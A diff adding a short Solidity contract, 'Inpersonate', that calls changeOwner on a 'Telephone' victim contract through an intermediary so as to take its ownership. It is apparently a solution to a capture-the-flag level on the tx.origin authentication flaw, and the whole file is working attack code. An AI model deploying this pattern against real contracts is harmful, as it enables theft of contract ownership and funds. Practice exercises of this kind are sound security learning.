@@ -1,0 +1,23 @@
+``` 
+` ```solidity `
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Telephone.sol";
+
+contract Inpersonate {
+    address public owner;
+    Telephone public telephone_victim;
+
+    constructor(Telephone _telephone_victim){
+        telephone_victim = Telephone(_telephone_victim);
+        owner = msg.sender;
+
+    }
+
+    function change() public {
+        telephone_victim.changeOwner(owner);
+    }
+       
+}
+```
